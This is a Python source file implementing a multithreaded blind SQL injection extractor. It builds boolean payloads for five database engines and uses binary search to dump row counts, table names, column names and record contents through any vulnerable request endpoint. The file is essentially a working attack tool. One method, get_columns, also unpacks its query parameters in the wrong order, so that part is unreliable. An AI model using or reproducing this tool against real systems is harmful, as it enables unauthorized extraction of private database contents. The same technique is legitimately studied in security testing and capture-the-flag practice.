from concurrent.futures import ThreadPoolExecutor

class SQLiBlinder:
	"""Blind SQL injector"""

	def __init__(self,request_func,dbms,multithreaded=True,threads=16):
		"""`request_func` - function, that take 1 param. If param is '1=1' request_func must return True,if param is '1=0' request_func must return False
		 `dbms` - one of ['mysql','mssql','oracle','sqlite']
		 `multithreaded` - if True run number of threads, else one
		 `threads` - number of threads (only for multithreaded)"""
		self.request_func = request_func
		self.dbms = dbms.lower()
		self.init_params(self.dbms)
		self.multithreaded=multithreaded
		self.threads=threads

	def init_params(self,dbms):
		supported = ['mysql','mssql','oracle','sqlite','postgre']
		if dbms not in supported:
			raise Exception('%s not supported'%dbms)
		if dbms == 'mysql':
			self.base_from_clause = 'FROM {table_name} {where} ORDER BY {order_by} limit 1 offset {row_num}'
			self.string_definition = 'SELECT %s'
			self.string_len_definition = 'SELECT length(%s)'
			self.string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'
			self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
			self.offset_shift=0
			self.tables_query = ['table_name','information_schema.tables',"table_schema <> 'information_schema'"]
			self.columns_query = ['column_name','information_schema.columns',"table_name = '{table_name}'"]

		#MSSQL
		if dbms == 'mssql':
			self.base_from_clause = 'FROM (SELECT *, ROW_NUMBER() OVER(ORDER by [{order_by}])n FROM {table_name} {where})T WHERE n={row_num}'
			self.string_definition = 'SELECT %s'
			self.string_len_definition = 'SELECT len(%s)'
			self.string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'
			self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
			self.offset_shift=1
		 
		#SQLITE
		if dbms == 'sqlite':
			self.base_from_clause = 'FROM {table_name} {where} ORDER BY {order_by} limit 1 offset {row_num}'
			self.string_definition = 'SELECT %s'
			self.string_len_definition = 'SELECT length(%s)'
			self.string_char_definition = 'SELECT hex(SUBSTR(%s,%d,1))'
			self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
			self.offset_shift=0
			self.tables_query = ['sql','sqlite_master',None]

		#oracle
		if dbms == 'oracle':
			self.base_from_clause = 'FROM (SELECT a.*, ROWNUM rn FROM {table_name} a {where} ORDER BY a.{order_by}) WHERE rn={row_num}'
			self.string_definition = 'SELECT %s'
			self.string_len_definition = 'SELECT LENGTH(%s)'
			self.string_char_definition = 'SELECT ASCII(SUBSTR(%s,%d,1))'
			self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
			self.offset_shift=1

		#postgre
		if dbms == 'postgre':
			self.base_from_clause = 'FROM {table_name} {where} ORDER BY {order_by} limit 1 offset {row_num}'
			self.string_definition = 'SELECT %s'
			self.string_len_definition = 'SELECT LENGTH(%s)'
			self.string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'
			self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
			self.offset_shift=0
			self.oid_query = ["cast(oid as text)","pg_catalog.pg_namespace","nspname not in ('pg_catalog', 'pg_toast')"]
			self.tables_query = ['relname','pg_catalog.pg_class',"relnamespace in (%s) AND relkind IN ('r','') AND pg_catalog.pg_table_is_visible(oid)"]

	def check(self):
		if self.request_func('1=1') == True:
			if self.request_func('1=0') == False:
				return True
		return False

	def define_string(self,table_name,column_name,index,where=None,order_by=None):
		if order_by is None:
			order_by = column_name
		return self.string_definition%(column_name) + ' ' + self.get_from_clause(table_name,index,order_by,where=where)

	def get_from_clause(self,table_name,index,order_by,where=None):
		to_where = ''
		if where != None:
			to_where = 'WHERE '+where
		return self.base_from_clause.format(order_by = order_by,table_name = table_name,where = to_where,row_num = index)

	def define_string_len(self,table_name,column_name,index,where=None,order_by=None):
		if order_by is None:
			order_by = column_name
		return self.string_len_definition%(column_name)+ ' ' + \
			self.get_from_clause(table_name,index,order_by,where)

	def define_string_char(self,table_name,column_name,index,string_pos,where=None,order_by=None):
		if order_by is None:
			order_by = column_name
		return self.string_char_definition%(column_name,string_pos) + ' ' + \
			self.get_from_clause(table_name,index,order_by,where)

	def define_count(self,table_name,where=None):
		to_where = ''
		if where != None:
			to_where = 'WHERE '+where
		return self.count_definition%(table_name,to_where)

	def build_sql_binary_query(self,query,value,search_for_number):
		if (self.dbms == 'sqlite') and (search_for_number==False):
			return "(%s)>=hex(char(%s))" % (query,value) #this is cause ' was banned in task, but works always
		else:
			return '(%s)>=%d' %(query,value)

	def get_bool(self,sql):
		return self.request_func(sql)

	def binary_search(self,s,start_val,start_val_defined=False,search_for_number=False): #start_val should be power of 2
		#define real_start_val:
		if not start_val_defined:
			while True:
				sql = self.build_sql_binary_query(s,start_val-1,search_for_number)
				#print sql
				r = self.get_bool(sql)
				if r:
					start_val*=8
				else:
					break
		#now start_val > len
		cur_val = start_val/2
		move = start_val/4
		while True:
			sql = self.build_sql_binary_query(s,cur_val,search_for_number)
			#print sql
			r = self.get_bool(sql)
			#print r
			if move<1:
				if r:
					return int(cur_val)
				else:
					return int(cur_val-1)
			if r: #(cur_val+1 - cur_val+2*move)
				cur_val+=move
			else:
				cur_val-=move
			move = move/2
		
	def get_count(self,table_name,where=None):
		s = self.define_count(table_name,where)
		return self.binary_search(s,32,False,True)

	def get_integer(self,table_name,column_name,index,where=None,order_by=None):
		s = self.define_string(table_name,column_name,index,where=where,order_by=order_by)
		return self.binary_search(s,32,False,True)

	def get_length_of_string(self,table_name,column_name,index,where=None,order_by=None):  
		s = self.define_string_len(table_name,column_name,index,where,order_by)
		return self.binary_search(s,32,False,True)

	def get_char(self,table_name,column_name,index,str_pos,where=None,order_by=None):
		s = self.define_string_char(table_name,column_name,index,str_pos,where,order_by)
		return chr(self.binary_search(s,256,True))

	def get_char_for_pool(self,chunk):
		return self.get_char(*chunk)

	def get_string(self,table_name,column_name,index,where=None,order_by=None,verbose=True):
		l = self.get_length_of_string(table_name,column_name,index,where,order_by)
		if verbose:
			print ('length(%s,%d): %d' % (column_name,index,l))
		r = ''
		if not self.multithreaded:
			for i in range(l):
				r+=self.get_char(table_name,column_name,index,i+1,where,order_by)
				#print r
			return r
		else:
			with ThreadPoolExecutor(max_workers=self.threads) as pool:
				r = ''.join(list(pool.map(self.get_char_for_pool,[(table_name,column_name,index,i+1,where,order_by) for i in range(l)])))
				return r

	def get(self,columns,table_name,where=None,order_by=None,verbose=True):
		count = self.get_count(table_name,where)
		print ('count of rows to extract: %d' % count)
		res = []
		if order_by is None:
			order_by = columns[0]
			r = [x for x in columns if x.lower() == 'id']
			if len(r) != 0:
				order_by = r[0]
		for i in range(count):
			cs = []
			for column in columns:
				cs.append(self.get_string(table_name,column,i+self.offset_shift,where,order_by,verbose))
			if verbose:
				print (cs)
			res.append(cs)
		return res

	def get_columns_with_types(self,table_name):
		if self.dbms == 'postgre':
			oid = self.get_string('pg_class','cast(oid as TEXT)',0,where="relname='%s'"%table_name,order_by='oid')
			oid = int(oid)
			cols = self.get(['attname','cast(atttypid as TEXT)'],'pg_attribute',where='attrelid=%d and attnum>0'%oid)
			types = list(set([c[1] for c in cols]))
			types_table = {}
			for typid in types:
				type_name = self.get_string('pg_type','typname',0,where='oid=%d'%int(typid),order_by='oid')
				types_table[typid]=type_name
			return [[col[0],types_table[col[1]]] for col in cols]
		else:
			return 'dbms not supported'

	def get_tables(self):
		if self.dbms == 'postgre':
			column,table,where = self.oid_query
			oids = self.get([column],table,where=where)
			oids = [x[0] for x in oids]
			print ('oids: ', oids)

			column,table,where = self.tables_query
			where = where %(','.join(oids))
			return self.get([column],table,where=where)
		if hasattr(self,'tables_query'):
			column,table,where = self.tables_query

			return self.get([column],table,where=where)
		else:
			print ('%s tables request is not maintained' % self.dbms)

	def get_columns(self,table_name):
		if hasattr(self,'columns_query'):
			table,column,where = self.columns_query

			columns = self.get([column],table,where=where.format(table_name=table_name))
			return [x[0] for x in columns]
		else:
			print ('%s columns request is not maintained' % self.dbms)
